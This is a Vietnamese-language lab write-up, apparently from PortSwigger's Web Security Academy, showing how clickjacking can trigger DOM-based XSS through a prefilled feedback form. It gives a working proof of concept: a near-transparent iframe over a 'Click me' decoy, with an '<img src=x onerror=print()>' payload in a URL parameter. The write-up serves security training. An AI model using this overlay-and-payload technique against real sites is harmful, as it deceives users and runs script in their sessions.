# Exploiting clickjacking vulnerability to trigger DOM-based XSS

Mục tiêu là craft html độc hại dựa trên lỗ hổng DOM-base XSS để call đến hàm print().

Trang web này không có chức năng đăng nhập nữa mà thay vào đó chúng ta thấy có 2 chức năng để gửi input :

+ `Submit feedback` được liên kết trên đầu trang
+ `comment` ở mỗi bài viết

Khi duyệt trang, burp xác nhận cho cả hai trang là chúng có thể đóng khung:

![image](https://user-images.githubusercontent.com/68894302/175196809-fc06ca7f-2463-41ed-9984-46bfbdee7dbe.png)
![image](https://user-images.githubusercontent.com/68894302/175196856-012b457a-b70e-43cd-8cee-aae1347bb9ff.png)

Chúng ta sẽ test trường hợp feedback trước.

Sử dụng pre-fill để điền trước nội dung, mục đích là để đưa nội dung tùy ý vào DOM của trang.

![123](https://user-images.githubusercontent.com/68894302/175197736-6ba5776f-b577-4ae5-b3c1-3faf9747ff31.png)

Đầu tiên thử `"<script` để thoát ra khỏi ngữ cảnh nhưng quan sát thấy rằng nó đã bị mã hóa 

![image](https://user-images.githubusercontent.com/68894302/175197951-81baca54-d024-44e0-b4a8-8a172e0240e5.png)

Nhìn vào tập lệnh tham chiếu này thấy một inject point

![image](https://user-images.githubusercontent.com/68894302/175198321-1411b06e-77d8-4ed8-b7ad-4edc1cdae4d9.png)

Nhưng chèn `<script>` không hoạt động. Trình duyệt đã phân tích cú pháp trang cho các khối tập lệnh, bất kỳ khối tập lệnh nào được thêm vào bây giờ sẽ chỉ nằm ở đó mà không được thực thi.

## Craft malicious HTML

``` html
<style>
    #vuln_site{
        position:relative;
        width:1000px;
        height:800px;
        opacity:0.1;
        z-index:2;
    }
    #evil_site{
        position:absolute;
        top:480px;
        left:50px;
        z-index:1;
    }
</style>
<div id="evil_site">Click me</div>
<iframe id="vuln_site" src="https://0a8400b40389ef0fc03f07cf00e30058.web-security-academy.net/feedback?name=<img+src=x+onerror=print()>&email=a@a&subject=b&message=c">
</iframe>
```

![image](https://user-images.githubusercontent.com/68894302/175199432-750f6d54-dba9-4bb0-8462-c9111e75d460.png)

OK mọi thứ đã tự động được điền, sửa lại Click me và opacity=0.00001 

![image](https://user-images.githubusercontent.com/68894302/175199768-f9597c90-7cd2-4d92-8261-2d1ee2c4c829.png)

![image](https://user-images.githubusercontent.com/68894302/175202396-c9b6a9df-7a77-4394-8c22-ad7423a8e8de.png)